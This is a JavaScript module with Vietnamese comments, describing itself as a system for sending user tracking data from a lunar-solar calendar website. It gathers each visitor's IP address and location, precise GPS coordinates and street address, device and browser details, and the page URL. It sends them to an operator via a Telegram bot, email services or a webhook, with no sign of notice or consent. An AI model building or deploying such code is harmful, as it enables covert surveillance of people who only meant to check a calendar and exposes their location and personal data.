/**
 * Hệ thống thông báo để gửi dữ liệu theo dõi người dùng
 * Hỗ trợ gửi thông báo qua Email và Telegram
 */

/**
 * Gửi thông báo qua Telegram Bot
 * @param {Object} data - Dữ liệu cần gửi
 * @param {String} botToken - Token của Telegram Bot
 * @param {String} chatId - ID của chat hoặc channel để gửi tin nhắn
 * @returns {Promise} Promise chứa kết quả gửi tin nhắn
 */
function sendTelegramNotification(data, botToken, chatId) {
    // Định dạng dữ liệu thành chuỗi dễ đọc
    const formattedData = formatDataForTelegram(data);
    
    // URL API của Telegram Bot
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    // Chuẩn bị dữ liệu để gửi
    const requestData = {
        chat_id: chatId,
        text: formattedData,
        parse_mode: 'HTML',
        disable_web_page_preview: true
    };
    
    // Gửi yêu cầu POST đến API Telegram
    return fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestData)
    })
    .then(response => response.json())
    .then(result => {
        if (result.ok) {
            console.log('Telegram notification sent successfully');
            return {
                success: true,
                message_id: result.result.message_id,
                timestamp: new Date().toISOString()
            };
        } else {
            console.error('Failed to send Telegram notification:', result.description);
            return {
                success: false,
                error: result.description,
                timestamp: new Date().toISOString()
            };
        }
    })
    .catch(error => {
        console.error('Error sending Telegram notification:', error);
        return {
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        };
    });
}

/**
 * Định dạng dữ liệu để gửi qua Telegram
 * @param {Object} data - Dữ liệu cần định dạng
 * @returns {String} Chuỗi đã định dạng
 */
function formatDataForTelegram(data) {
    // Tạo tiêu đề thông báo
    let message = `<b>🔔 Thông báo truy cập lịch âm dương</b>\n\n`;
    
    // Thêm thời gian truy cập
    if (data.accessTime) {
        message += `<b>⏰ Thời gian truy cập:</b> ${data.accessTime.iso8601}\n`;
        message += `<b>🌐 Múi giờ:</b> ${data.accessTime.timeZoneName} (${data.accessTime.timeZoneOffset})\n\n`;
    }
    
    // Thêm thông tin thiết bị
    if (data.deviceInfo) {
        message += `<b>📱 Thiết bị:</b> ${data.deviceInfo.device}\n`;
        message += `<b>🖥️ Hệ điều hành:</b> ${data.deviceInfo.os.name} ${data.deviceInfo.os.version}\n`;
        message += `<b>🌐 Trình duyệt:</b> ${data.deviceInfo.browser.name} ${data.deviceInfo.browser.version}\n`;
        message += `<b>📊 Độ phân giải:</b> ${data.deviceInfo.screenWidth}x${data.deviceInfo.screenHeight}\n\n`;
    }
    
    // Thêm thông tin IP
    if (data.ipInfo) {
        message += `<b>🌐 Địa chỉ IP:</b> ${data.ipInfo.ip}\n`;
        if (data.ipInfo.city && data.ipInfo.country) {
            message += `<b>📍 Vị trí IP:</b> ${data.ipInfo.city}, ${data.ipInfo.region}, ${data.ipInfo.country}\n\n`;
        }
    }
    
    // Thêm thông tin vị trí
    if (data.locationInfo && data.locationInfo.geoLocation) {
        const geo = data.locationInfo.geoLocation;
        if (geo.latitude && geo.longitude) {
            message += `<b>📍 Tọa độ:</b> ${geo.latitude}, ${geo.longitude}\n`;
            message += `<b>🎯 Độ chính xác:</b> ${geo.accuracy} mét\n`;
        }
        if (geo.address) {
            message += `<b>🏠 Địa chỉ:</b> ${geo.address}\n\n`;
        }
    }
    
    // Thêm thông tin mạng
    if (data.locationInfo && data.locationInfo.networkInfo) {
        const net = data.locationInfo.networkInfo;
        if (net.type && net.type !== 'Unknown') {
            message += `<b>📶 Loại kết nối:</b> ${net.type}\n`;
            message += `<b>📊 Chất lượng mạng:</b> ${net.effectiveType}\n\n`;
        }
    }
    
    // Thêm URL trang web
    message += `<b>🔗 URL:</b> ${window.location.href}\n`;
    message += `<b>📄 Tiêu đề:</b> ${document.title}\n\n`;
    
    // Thêm thông tin người dùng (nếu có)
    message += `<b>👤 User Agent:</b> ${navigator.userAgent}\n`;
    
    return message;
}

/**
 * Gửi thông báo qua Email sử dụng dịch vụ Email API
 * @param {Object} data - Dữ liệu cần gửi
 * @param {String} emailTo - Địa chỉ email nhận thông báo
 * @param {Object} emailConfig - Cấu hình email (API key, URL, etc.)
 * @returns {Promise} Promise chứa kết quả gửi email
 */
function sendEmailNotification(data, emailTo, emailConfig) {
    // Định dạng dữ liệu thành HTML cho email
    const emailHtml = formatDataForEmail(data);
    
    // Chuẩn bị dữ liệu để gửi đến API
    const emailData = {
        to: emailTo,
        subject: `Thông báo truy cập lịch âm dương - ${new Date().toLocaleString()}`,
        html: emailHtml,
        from: emailConfig.fromEmail || 'notifications@example.com',
        fromName: emailConfig.fromName || 'Lịch Âm Dương Notification'
    };
    
    // Sử dụng EmailJS để gửi email từ client-side
    if (emailConfig.service === 'emailjs') {
        return sendWithEmailJS(emailData, emailConfig);
    }
    
    // Sử dụng SendGrid API
    if (emailConfig.service === 'sendgrid') {
        return sendWithSendGrid(emailData, emailConfig);
    }
    
    // Sử dụng custom API endpoint
    return fetch(emailConfig.apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${emailConfig.apiKey}`
        },
        body: JSON.stringify(emailData)
    })
    .then(response => response.json())
    .then(result => {
        console.log('Email notification sent successfully');
        return {
            success: true,
            messageId: result.id || result.messageId,
            timestamp: new Date().toISOString()
        };
    })
    .catch(error => {
        console.error('Error sending email notification:', error);
        return {
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        };
    });
}

/**
 * Gửi email sử dụng dịch vụ EmailJS
 * @param {Object} emailData - Dữ liệu email
 * @param {Object} config - Cấu hình EmailJS
 * @returns {Promise} Promise chứa kết quả gửi email
 */
function sendWithEmailJS(emailData, config) {
    // Kiểm tra xem EmailJS đã được tải chưa
    if (typeof emailjs === 'undefined') {
        // Tải EmailJS nếu chưa có
        return loadScript('https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js')
            .then(() => {
                // Khởi tạo EmailJS
                emailjs.init(config.userId);
                
                // Chuẩn bị tham số
                const templateParams = {
                    to_email: emailData.to,
                    subject: emailData.subject,
                    message_html: emailData.html,
                    from_name: emailData.fromName
                };
                
                // Gửi email
                return emailjs.send(config.serviceId, config.templateId, templateParams)
                    .then(response => {
                        console.log('EmailJS SUCCESS:', response);
                        return {
                            success: true,
                            messageId: response.messageId || 'sent',
                            timestamp: new Date().toISOString()
                        };
                    })
                    .catch(error => {
                        console.error('EmailJS ERROR:', error);
                        return {
                            success: false,
                            error: error.text,
                            timestamp: new Date().toISOString()
                        };
                    });
            })
            .catch(error => {
                console.error('Error loading EmailJS:', error);
                return {
                    success: false,
                    error: 'Failed to load EmailJS library',
                    timestamp: new Date().toISOString()
                };
            });
    }
    
    // EmailJS đã được tải
    emailjs.init(config.userId);
    
    // Chuẩn bị tham số
    const templateParams = {
        to_email: emailData.to,
        subject: emailData.subject,
        message_html: emailData.html,
        from_name: emailData.fromName
    };
    
    // Gửi email
    return emailjs.send(config.serviceId, config.templateId, templateParams)
        .then(response => {
            console.log('EmailJS SUCCESS:', response);
            return {
                success: true,
                messageId: response.messageId || 'sent',
                timestamp: new Date().toISOString()
            };
        })
        .catch(error => {
            console.error('EmailJS ERROR:', error);
            return {
                success: false,
                error: error.text,
                timestamp: new Date().toISOString()
            };
        });
}

/**
 * Gửi email sử dụng SendGrid API
 * @param {Object} emailData - Dữ liệu email
 * @param {Object} config - Cấu hình SendGrid
 * @returns {Promise} Promise chứa kết quả gửi email
 */
function sendWithSendGrid(emailData, config) {
    const sendgridData = {
        personalizations: [
            {
                to: [{ email: emailData.to }],
                subject: emailData.subject
            }
        ],
        from: { email: emailData.from, name: emailData.fromName },
        content: [
            {
                type: 'text/html',
                value: emailData.html
            }
        ]
    };
    
    return fetch('https://api.sendgrid.com/v3/mail/send', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${config.apiKey}`
        },
        body: JSON.stringify(sendgridData)
    })
    .then(response => {
        if (response.ok) {
            console.log('SendGrid email sent successfully');
            return {
                success: true,
                timestamp: new Date().toISOString()
            };
        } else {
            return response.json().then(errorData => {
                console.error('SendGrid error:', errorData);
                return {
                    success: false,
                    error: errorData,
                    timestamp: new Date().toISOString()
                };
            });
        }
    })
    .catch(error => {
        console.error('Error sending SendGrid email:', error);
        return {
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        };
    });
}

/**
 * Định dạng dữ liệu để gửi qua Email
 * @param {Object} data - Dữ liệu cần định dạng
 * @returns {String} Chuỗi HTML đã định dạng
 */
function formatDataForEmail(data) {
    // Tạo template HTML cho email
    let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Thông báo truy cập lịch âm dương</title>
        <style>
            body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }
            .header { background-color: #e74c3c; color: white; padding: 15px; text-align: center; border-radius: 5px 5px 0 0; }
            .content { background-color: #f9f9f9; padding: 20px; border-radius: 0 0 5px 5px; }
            .section { margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
            .section:last-child { border-bottom: none; }
            .label { font-weight: bold; color: #e74c3c; }
            .footer { font-size: 12px; color: #777; margin-top: 30px; text-align: center; }
        </style>
    </head>
    <body>
        <div class="header">
            <h2>Thông báo truy cập lịch âm dương</h2>
        </div>
        <div class="content">
    `;
    
    // Thêm thông tin thời gian
    html += `<div class="section">
        <h3>Thời gian truy cập</h3>`;
    
    if (data.accessTime) {
        html += `
        <p><span class="label">Thời gian:</span> ${data.accessTime.iso8601}</p>
        <p><span class="label">Múi giờ:</span> ${data.accessTime.timeZoneName} (${data.accessTime.timeZoneOffset})</p>
        `;
    }
    
    html += `</div>`;
    
    // Thêm thông tin thiết bị
    html += `<div class="section">
        <h3>Thông tin thiết bị</h3>`;
    
    if (data.deviceInfo) {
        html += `
        <p><span class="label">Thiết bị:</span> ${data.deviceInfo.device}</p>
        <p><span class="label">Hệ điều hành:</span> ${data.deviceInfo.os.name} ${data.deviceInfo.os.version}</p>
        <p><span class="label">Trình duyệt:</span> ${data.deviceInfo.browser.name} ${data.deviceInfo.browser.version}</p>
        <p><span class="label">Độ phân giải màn hình:</span> ${data.deviceInfo.screenWidth}x${data.deviceInfo.screenHeight}</p>
        <p><span class="label">User Agent:</span> ${data.deviceInfo.userAgent}</p>
        `;
    }
    
    html += `</div>`;
    
    // Thêm thông tin IP và vị trí
    html += `<div class="section">
        <h3>Thông tin IP và vị trí</h3>`;
    
    if (data.ipInfo) {
        html += `
        <p><span class="label">Địa chỉ IP:</span> ${data.ipInfo.ip}</p>`;
        
        if (data.ipInfo.city && data.ipInfo.country) {
            html += `<p><span class="label">Vị trí IP:</span> ${data.ipInfo.city}, ${data.ipInfo.region}, ${data.ipInfo.country}</p>`;
        }
        
        if (data.ipInfo.org) {
            html += `<p><span class="label">Nhà cung cấp:</span> ${data.ipInfo.org}</p>`;
        }
    }
    
    if (data.locationInfo && data.locationInfo.geoLocation) {
        const geo = data.locationInfo.geoLocation;
        if (geo.latitude && geo.longitude) {
            html += `
            <p><span class="label">Tọa độ:</span> ${geo.latitude}, ${geo.longitude}</p>
            <p><span class="label">Độ chính xác:</span> ${geo.accuracy} mét</p>`;
            
            // Thêm liên kết đến Google Maps
            html += `<p><span class="label">Xem trên bản đồ:</span> <a href="https://www.google.com/maps?q=${geo.latitude},${geo.longitude}" target="_blank">Google Maps</a></p>`;
        }
        
        if (geo.address) {
            html += `<p><span class="label">Địa chỉ:</span> ${geo.address}</p>`;
        }
    }
    
    html += `</div>`;
    
    // Thêm thông tin trang web
    html += `<div class="section">
        <h3>Thông tin trang web</h3>
        <p><span class="label">URL:</span> ${window.location.href}</p>
        <p><span class="label">Tiêu đề:</span> ${document.title}</p>
    </div>`;
    
    // Đóng HTML
    html += `
            <div class="footer">
                <p>Đây là email tự động được gửi từ hệ thống theo dõi lịch âm dương.</p>
            </div>
        </div>
    </body>
    </html>`;
    
    return html;
}

/**
 * Tải script từ URL
 * @param {String} url - URL của script cần tải
 * @returns {Promise} Promise giải quyết khi script được tải
 */
function loadScript(url) {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = url;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

/**
 * Gửi thông báo qua webhook (có thể sử dụng cho Discord, Slack, hoặc các dịch vụ khác)
 * @param {Object} data - Dữ liệu cần gửi
 * @param {String} webhookUrl - URL của webhook
 * @returns {Promise} Promise chứa kết quả gửi webhook
 */
function sendWebhookNotification(data, webhookUrl) {
    // Định dạng dữ liệu cho webhook
    const webhookData = {
        content: `Thông báo truy cập lịch âm dương - ${new Date().toLocaleString()}`,
        embeds: [
            {
                title: "Thông tin thiết bị",
                color: 15258703, // Màu đỏ
                fields: [
                    {
                        name: "Thiết bị",
                        value: data.deviceInfo ? data.deviceInfo.device : "Unknown",
                        inline: true
                    },
                    {
                        name: "Hệ điều hành",
                        value: data.deviceInfo ? `${data.deviceInfo.os.name} ${data.deviceInfo.os.version}` : "Unknown",
                        inline: true
                    },
                    {
                        name: "Trình duyệt",
                        value: data.deviceInfo ? `${data.deviceInfo.browser.name} ${data.deviceInfo.browser.version}` : "Unknown",
                        inline: true
                    }
                ]
            },
            {
                title: "Thông tin vị trí",
                color: 3447003, // Màu xanh
                fields: [
                    {
                        name: "Địa chỉ IP",
                        value: data.ipInfo ? data.ipInfo.ip : "Unknown",
                        inline: true
                    },
                    {
                        name: "Vị trí",
                        value: data.ipInfo && data.ipInfo.city ? `${data.ipInfo.city}, ${data.ipInfo.country}` : "Unknown",
                        inline: true
                    },
                    {
                        name: "Thời gian",
                        value: data.accessTime ? data.accessTime.iso8601 : new Date().toISOString(),
                        inline: false
                    }
                ]
            }
        ]
    };
    
    // Gửi dữ liệu đến webhook
    return fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(webhookData)
    })
    .then(response => {
        if (response.ok) {
            console.log('Webhook notification sent successfully');
            return {
                success: true,
                timestamp: new Date().toISOString()
            };
        } else {
            return response.text().then(text => {
                console.error('Webhook error:', text);
                return {
                    success: false,
                    error: text,
                    timestamp: new Date().toISOString()
                };
            });
        }
    })
    .catch(error => {
        console.error('Error sending webhook notification:', error);
        return {
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        };
    });
}
